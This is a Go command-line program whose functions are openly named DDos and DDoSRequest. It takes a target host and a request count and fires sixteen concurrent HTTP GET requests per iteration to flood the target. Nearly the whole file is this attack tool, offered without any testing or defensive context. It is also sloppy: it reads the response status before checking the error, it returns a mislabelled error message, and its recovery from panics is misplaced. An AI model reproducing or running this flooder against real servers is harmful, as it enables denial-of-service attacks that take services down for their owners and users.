package cli

import (
	"fmt"
	"log"
	"net/http"
	"os"
	"strconv"

	"github.com/urfave/cli/v2"
)

func CliApp() {
	app := &cli.App{
		Flags: []cli.Flag{
			&cli.StringFlag{
				Name:    "host",
				Aliases: []string{"wh"},
				Usage:   "Set the host target",
			},
			&cli.StringFlag{
				Name:    "requests",
				Aliases: []string{"r"},
				Usage:   "Quantity of requests",
			},
		},
		Action: func(cCtx *cli.Context) error {
			// host := ""

			// if cCtx.NArg() > 0 {
			// 	host = cCtx.Args().Get(0)
			// }

			if cCtx.String("host") == "" {
				return fmt.Errorf("host is empty")
			}

			if cCtx.String("requests") == "" {
				return fmt.Errorf("host is empty")
			}

			if cCtx.String("host") != "" && cCtx.String("requests") != "" {
				fmt.Println(cCtx.String("host"))
				fmt.Println(cCtx.String("requests"))

				DDos(cCtx.String("host"), cCtx.String("requests"))
			}

			return nil
		},
	}

	if err := app.Run(os.Args); err != nil {
		log.Fatal(err)
	}
}

func recoverConnection() {
	if r := recover(); r != nil {
		fmt.Println("Recover OK")
	}
}

func DDos(host string, requests string) {

	r, err := strconv.ParseInt(requests, 10, 64)
	if err != nil {
		log.Fatal(err)
	}

	for i := 0; int64(i) < r; i++ {
		go DDoSRequest(host)
		go DDoSRequest(host)
		go DDoSRequest(host)
		go DDoSRequest(host)
		go DDoSRequest(host)
		go DDoSRequest(host)
		go DDoSRequest(host)
		go DDoSRequest(host)
		go DDoSRequest(host)
		go DDoSRequest(host)
		go DDoSRequest(host)
		go DDoSRequest(host)
		go DDoSRequest(host)
		go DDoSRequest(host)
		go DDoSRequest(host)
		go DDoSRequest(host)
	}
}

func DDoSRequest(host string) {

	url := host
	response, err := http.Get(url)

	fmt.Println(response.Status)

	if err == nil {
		response.Close = true
		defer response.Body.Close()

	} else {
		fmt.Println(err) // printing the error
		panic(err)
	}
	defer recoverConnection()
}
